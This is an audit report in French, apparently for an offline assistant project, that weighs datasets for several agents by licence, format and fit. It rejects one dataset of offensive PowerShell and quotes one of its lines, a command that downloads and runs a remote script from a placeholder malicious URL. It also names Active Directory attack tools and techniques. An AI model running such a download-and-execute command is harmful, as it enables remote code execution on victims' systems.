# 📋 AUDIT_v2.md — Datasets Phase 0 révisée (validé Dev Senior)

**Date** : 2026-08-17
**HEAD** : fa2e1ac
**Objectif** : Remplacer 4 datasets mal adaptés (@dev, @network, @hardware, @vision)

> **Correction Dev Senior (2026-08-17)** : 3 ajustements majeurs post-audit
> 1. **@vision : SORTI du périmètre dataset** — RapidOCR = script ONNX déterministe, LLM texte = Qwen2.5-7B pré-entraîné. Aucun fine-tuning → zéro besoin dataset. KB @vision = pages wiki manuelles (patterns docs FR) créées en Phase 2 par LLM Wiki.
> 2. **@network : filtre explicite anti-doublon MITRE** — exclure malware/exfiltration/persistence (déjà dans MITRE @cyber). Garder seulement réseau pur : LDAP, DNS, Kerberos, SMB, RPC, WinRM, NetBIOS.
> 3. **@dev : candidat concret identifié** — `microsoft/PowerShell-Scripts` (GitHub officiel, MIT), PowerShell Gallery, Microsoft Learn (CC-BY-4.0). Couvre exactement `_detect_skill_from_code` (powershell fence).

---

## Tableau synthétique

| Agent | Dataset actuel | Fit | Candidat recommandé | Licence | Taille | Fit candidat |
|-------|---------------|-----|---------------------|---------|--------|--------------|
| @cyber | MITRE ATT&CK | ✅ | — | — | — | — |
| @dev | CodeSearchNet | ⚠️ | `microsoft/PowerShell-Scripts` (GitHub) + PowerShell Gallery + Microsoft Learn | MIT / CC-BY-4.0 | À confirmer | ✅ |
| @network | SNAP AS-Skitter | ❌ | `AYI-NEDJIMI/ad-attacks-en` (**filtré réseau pur**) | Apache-2.0 | 294 kB | ✅ (avec filtre) |
| @hardware | UCI Grid | ❌ | `Eng-Elias/multios-terminal-commands` | MIT | 5,72 MB | ✅ |
| @vision | COCO 2017 | ❌ | **AUCUN DATASET** (KB manuelle Phase 2) | — | — | N/A |

---

## Audit détaillé par candidat

### 1. dessertlab/offensive-powershell
- **Licence** : GPL-3.0 (copyleft — redistribution impose même licence, incompatible usage commercial sans opensource complet)
- **Taille** : 1 127 lignes / 120 kB (parquet)
- **Format** : parquet (convertible JSONL via `datasets` lib)
- **Exemple** : `Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious.ps1')"` — code PowerShell **malveillant** (download/execute, RID hijacking, Mimikatz, etc.)
- **Langue** : Anglais (code + commentaires techniques)
- **Fit @dev** : ❌ — L'agent @dev (`techlead`, `factory.py:61-65`, `generic.py:95-98`) détecte des scripts **légitimes** PowerShell/bash/python via `_detect_skill_from_code` (`base.py:271`) pour suggérer des skills de développement (`script.ps1`, `script.sh`, `script.py`). Ce dataset ne contient **que du code offensif/malveillant** — zéro script admin, dev, automation légitime. De plus, licence GPL-3.0 = risque juridique pour redistribution clé USB commerciale.
- **Verdict** : ❌ **REJETÉ** (contenu malveillant + licence copyleft)

### 2. microsoft/rpr
- **Licence** : CDLA-Permissive-2.0 (permissive, compatible redistribution)
- **Taille** : 11 185 lignes / ~14 MB (parquet)
- **Format** : parquet (colonnes : `prompt`, `response_a`, `response_b`, `criteria_x`, `criteria_y`, `category_x`, `category_y`, `scenario_x`, `scenario_y`, `profile_0-4`)
- **Exemple** : `"Craft a simple set of rules for shareholders agreement..."` / `"What is CRISP?"` / `"my favorite films are indiana jones..."` — paires **préférence RLHF généralistes** (écriture, knowledge, coding, reasoning), **pas** paires code/docstring.
- **Langue** : Anglais
- **Fit @dev** : ❌ — L'agent @dev a besoin de **paires (code, explication)** ou **scripts annotés** pour alimenter `wiki/pages/patterns/` (error handling, patterns PowerShell, etc.). RPR est un dataset de **préférences humaines pour RLHF** (comparaison réponses A vs B), sans focus code. Ne couvre aucune skill `@dev` (pas de détection `_detect_skill_from_code` exploitable).
- **Verdict** : ❌ **REJETÉ** (mauvais type de données — RLHF préférences, pas code)

### 3. AYI-NEDJIMI/ad-attacks-en
- **Licence** : Apache-2.0 (permissive, compatible redistribution commerciale)
- **Taille** : 294 kB total (4 fichiers JSON)
- **Format** : 4 fichiers JSON structurés :
  - `attacks.json` (46 entrées : id, name, description, category, mitre_technique_ids, severity, prerequisites, tools, detection, mitigation, source_url)
  - `tools.json` (33 outils : Mimikatz, Impacket, BloodHound, Rubeus, etc.)
  - `detection_rules.json` (30 règles Sigma avec Event IDs Windows)
  - `qa_dataset.json` (80+ paires Q/R : question, answer, category, reference, difficulty, keywords)
- **Exemple (attacks.json)** : `{"id": "T1558.003", "name": "Kerberoasting", "category": "credential_access", "mitre_technique_ids": ["T1558.003"], "severity": "High", "tools": ["Rubeus", "Impacket"], "detection": "EventID 4769..."}`
- **Langue** : Anglais
- **Fit @network** : ✅ — L'agent @network (`devops`, `factory.py:67-71`) a pour `domain_prompt` **« Expert réseaux »**. Bien que le nom suggère réseau pur, le contexte Windows portable JARVIS fait que l'audit AD (Active Directory) **est** du réseau local Windows : LDAP, Kerberos, SMB, RPC, DNS — protocoles réseau cœur de l'AD. Les 46 attaques mappées MITRE, 30 règles Sigma (Event IDs), 33 outils pentest AD couvrent **≥ 4 skills réseau** : scan réseau (`network_sweep` — `cyber_workflows.json:121-136`), énumération LDAP/SPN/GPO, détection mouvements latéraux (Pass-the-Hash, PSExec, WMI, WinRM, SMB Relay), durcissement AD. Format JSON → JSONL trivial. Offline-first ✅.
- **⚠️ Filtre anti-doublon MITRE (correction Dev Senior)** : `ad-attacks-en` chevauche MITRE ATT&CK (@cyber) sur Kerberoasting (T1558.003), Pass-the-Hash (T1550.002), BloodHound, DCSync, Golden/Silver Ticket, etc. **À l'ingest (MT-KB-L2b), filtrer explicitement** :
  - **GARDER (réseau pur)** : LDAP queries/enum, DNS, Kerberos tickets, SMB/RPC/WinRM/NetBIOS, scan réseau, GPO, Trusts
  - **EXCLURE (déjà MITRE @cyber)** : malware, exfiltration, persistence, privilege escalation (PrintNightmare, ZeroLogon, PetitPotam), credential dumping (LSASS, NTDS.dit), lateral movement tools (Mimikatz, Impacket, Rubeus)
- **Verdict** : ✅ **VALIDÉ AVEC FILTRE** (remplace SNAP AS-Skitter pour @network)

### 4. pAILabs/infosec-security-qa
- **Licence** : Apache-2.0 (permissive)
- **Taille** : 11 185 lignes / 14,2 MB (JSONL/parquet)
- **Format** : JSON (colonnes `question`, `answer` — paires Q/R)
- **Exemple** : `"What are the key features of Phishing-as-a-Service (PhaaS) platforms..."` / `"How can security operations teams use AdFind to simulate threat actor discovery techniques?"` / `"What strategies can be employed to mitigate packet capture limitations within virtualized environments?"`
- **Langue** : Anglais
- **Fit @network** : ⚠️ — Contenu infosec large (phishing, ransomware, Netlas.io, packet capture, SOC, NetScaler, crypto laundering, honeypots, SIM swap, DDoS, Office vulns, FortiOS, etc.). Quelques entrées réseau (packet capture, Netlas.io, AdFind/LDAP) mais **majoritairement cyber généraliste**. L'agent @network (`devops`) attend un focus **réseau local Windows** (routing, switching, DNS, DHCP, firewall, VPN, monitoring trafic). Ce dataset dilue le signal réseau dans du cyber général. Moins bon fit que `ad-attacks-en` qui est 100% AD/réseau Windows.
- **Verdict** : ⚠️ **SECONDAIRE** (garder comme appoint si volume nécessaire, mais `ad-attacks-en` prioritaire)

### 5. Eng-Elias/multios-terminal-commands
- **Licence** : MIT (permissive, compatible redistribution commerciale)
- **Taille** : 11 507 lignes / 5,72 MB (JSON)
- **Format** : JSON (champs `instruction`, `input` = OS tag `[LINUX]`/`[WINDOWS]`/`[MAC]`, `output` = commande ou JSON multi-plateforme)
- **Exemple** : `{"instruction": "Find the PID of 'mysql'", "input": "", "output": "{\"description\": \"Find the PID of 'mysql'\", \"linux\": \"pgrep mysql\", \"windows\": \"tasklist | findstr mysql\", \"mac\": \"pgrep mysql\"}"}` / `{"instruction": "Check AppArmor status", "input": "[WINDOWS]", "output": "echo N/A"}`
- **Langue** : Anglais (commandes + descriptions)
- **Fit @hardware** : ✅ — L'agent @hardware (`orchestrateur`, `factory.py:73-86`) a pour `domain_prompt` l'utilisation de l'outil **`why_running` / `witr`** pour expliquer pourquoi un processus/port/service tourne (`services/diagnostic_ext/service.py:99-108`). Ce dataset fournit **des centaines de commandes Windows** (tasklist, netstat, wmic, Get-Process, Get-Service, sc query, powershell remoting, etc.) + équivalents Linux/Mac — **exactement** le vocabulaire terminal que l'orchestrateur doit connaître pour diagnostiquer. Couvre skills : processus, ports, services, disque, réseau, packages, logs, permissions. Format JSON → JSONL direct. Offline-first ✅. Taille < 100 Mo ✅.
- **Verdict** : ✅ **VALIDÉ** (remplace UCI Grid pour @hardware)

### 6. Voxel51/consolidated_receipt_dataset
- **Licence** : CC-BY-4.0 (permissive)
- **Taille** : 801 images / taille non spécifiée (imagefolder)
- **Format** : imagefolder (images JPEG/PNG) — **pas de texte, pas d'annotations OCR**
- **Exemple** : Images de reçus (supermarché, restaurant) — task = object detection / visual QA / document retrieval
- **Langue** : Anglais (texte sur images)
- **Fit @vision** : ❌ — L'agent @vision (`vision.py:1-157`) utilise **RapidOCR (ONNX déterministe)** pour extraire le texte (`services/ocr.py`), puis un LLM texte (`Qwen2.5-7B`, `vision.py:45`) pour l'analyse. Ce dataset ne fournit **que des images brutes** pour détection d'objets/VQA — **aucune annotation texte/OCR**, aucun ground-truth d'extraction. Ne sert pas l'étape OCR ni l'étape analyse LLM.
- **Verdict** : ❌ **REJETÉ** (mauvaise tâche — detection/VQA, pas OCR)

### 7. UniqueData/ocr-text-detection-in-the-documents
- **Licence** : **CC-BY-NC-ND-4.0** (NON-COMMERCIAL, NO DERIVATIVES — **BLOQUANT** pour redistribution clé USB commerciale + interdiction de créer dérivés JSONL)
- **Taille** : 32 lignes / 34,8 MB (imagefolder + XML annotations)
- **Format** : images + `annotations.xml` (bounding boxes : Text Title / Text Paragraph / Table / Handwritten)
- **Exemple** : Images documents scannés avec boîtes englobantes texte — **détection** (localisation), pas **reconnaissance** (texte extrait)
- **Langue** : Anglais
- **Fit @vision** : ❌ — Double problème : (1) **Licence NC-ND = interdit redistribution commerciale** (clé USB JARVIS vendue/distribuée) et **interdit conversion JSONL** (dérivé). (2) Contenu = **text detection** (bounding boxes), pas **text recognition/OCR** (texte extrait). L'agent @vision a RapidOCR pour l'extraction — il n'a pas besoin d'apprendre la détection, il a besoin de corpus **texte extrait** pour l'analyse LLM post-OCR. 32 échantillons = trop faible de toute façon.
- **Verdict** : ❌ **REJETÉ** (licence bloquante + mauvaise tâche + volume insuffisant)

---

### 8. Analyse architecturale @vision (correction Dev Senior)

> **Constat clé** : L'agent @vision **n'a besoin d'AUCUN dataset d'ingest**.

**Preuve par le code** (`agents/vision.py:1-157`, `services/ocr.py`) :
- **RapidOCR** = moteur OCR ONNX déterministe (`services/ocr.py:run_ocr`), **pas un modèle à entraîner**. Zéro paramètres apprenables, zéro dataset requis.
- **LLM analyse** = `Qwen2.5-7B-Instruct` (`vision.py:45`, `VISION_ANALYSIS_MODEL`) — modèle **généraliste pré-entraîné**, pas fine-tuné sur données vision.
- **Pipeline** : Image → RapidOCR (extraction texte déterministe) → LLM texte (analyse via prompt `VISION_ANALYSIS_SYSTEM`).
- **Aucune étape d'entraînement, fine-tuning, ou RAG spécifique vision**.

**Ce dont @vision a vraiment besoin dans la KB (Phase 2, manuel)** :
- Pages wiki `wiki/pages/skills/` : "Analyse facture FR", "Conventions format administratif", "Patterns reçu restaurant", "Extraction tableaux financiers", "Reconnaissance formulaires Cerfa"
- Ces pages seront **créées par le LLM Wiki (Phase 2)**, pas ingérées depuis un dataset externe.

**Conclusion** : @vision **sort du périmètre datasets**. La recommandation initiale "chercher dataset OCR" était une erreur d'architecture (confusion entraînement vs inférence).

---

## Recommandation finale (validée Dev Senior)

**À garder** : MITRE ATT&CK (@cyber) — inchangé

**À remplacer** :
- @dev → **`microsoft/PowerShell-Scripts` (GitHub officiel)** + PowerShell Gallery + Microsoft Learn — scripts PowerShell **légitimes** (admin, dev, automation), licences MIT/CC-BY-4.0, couvrants `_detect_skill_from_code` (`base.py:271`). À vérifier : volume, structure, convertibilité JSONL.
- @network → **`AYI-NEDJIMI/ad-attacks-en`** (Apache-2.0, 294 kB, **filtré réseau pur** : LDAP, DNS, Kerberos, SMB, RPC, WinRM, NetBIOS, scan, GPO, Trusts — exclure malware/exfil/persistence déjà dans MITRE @cyber)
- @hardware → **`Eng-Elias/multios-terminal-commands`** (MIT, 5,72 MB, JSON multi-OS, commandes terminal Windows/Linux/Mac)
- @vision → **AUCUN DATASET** — @vision sort du périmètre datasets. KB @vision = pages wiki manuelles Phase 2 (patterns docs FR, conventions admin, reçus, tableaux, formulaires) créées par LLM Wiki.

**Licences validées** : Apache-2.0 (`ad-attacks-en` filtré), MIT (`multios-terminal-commands`, `PowerShell-Scripts`), CC-BY-4.0 (Microsoft Learn)
**Licences problématiques** : GPL-3.0 (`offensive-powershell` — copyleft), CDLA-Permissive-2.0 (`rpr` — OK licence mais mauvais contenu), CC-BY-NC-ND-4.0 (`ocr-text-detection` — NC/ND bloquant), CC-BY-4.0 (`consolidated_receipt` — OK licence mais mauvaise tâche)

---

## Risques identifiés (mis à jour)

1. **@dev : vérification candidat Microsoft** — `microsoft/PowerShell-Scripts` (GitHub) à auditer (volume, structure, licences par script). Fallback : PowerShell Gallery (packages) + Microsoft Learn (docs CC-BY-4.0). Phase 2 KB (@dev) attend ce corpus.

2. **@network : filtre à l'ingest** — Le filtrage "réseau pur vs cyber/MITRE" doit être codé dans le script de conversion MT-KB-L2b (critères explicites : garder catégories `reconnaissance` + `lateral_movement` protocoles réseau uniquement, exclure `credential_access`, `persistence`, `privilege_escalation`, `defense_evasion` malware/outils).

3. **@vision : hors périmètre dataset** — Confirmer que Phase 2 LLM Wiki génère bien les pages `@vision` (patterns docs FR) sans dataset source. Risque : si LLM Wiki échoue, prévoir rédaction manuelle légère (5-10 pages ciblées).

4. **Volume @network** : `ad-attacks-en` filtré ≈ 80-100 entrées (sur 190). Pour 1000 entrées JSONL cible, compléter avec `infosec-security-qa` entrées réseau uniquement (packet capture, Netlas, AdFind/LDAP ~500 entrées) ou dupliquer/augmenter.

5. **Langue unique (EN)** : Tous les candidats validés sont en anglais. JARVIS cible utilisateurs FR. Solution : soit accepter EN (qualité technique prime), soit traduire champs `text`/`description` via LLM offline à l'ingest (coût GPU unique).

---

## Prochaine étape (MT-KB-L2b)

Audit validé humainement (avec corrections Dev Senior) → téléchargement ciblé + conversion JSONL + update `PREPARATION.md`

**Plan de téléchargement ciblé (révisé)** :
1. `AYI-NEDJIMI/ad-attacks-en` → 4 JSON → JSONL unifié **avec filtre réseau pur** (exclure catégories MITRE chevauchantes : credential_access, persistence, privilege_escalation, defense_evasion malware/outils)
2. `Eng-Elias/multios-terminal-commands` → JSON → JSONL (1 entrée par instruction, champ `agent: "@hardware"`)
3. **`microsoft/PowerShell-Scripts` (GitHub)** → audit + téléchargement + conversion JSONL (vérifier structure, licences par script, volume)
4. **PAS de téléchargement @vision** — confirmé hors périmètre datasets

**Seuil entrée MT-KB-L2b** : validation humaine de ce rapport révisé (confirmation candidat @dev Microsoft, filtre @network, sortie @vision).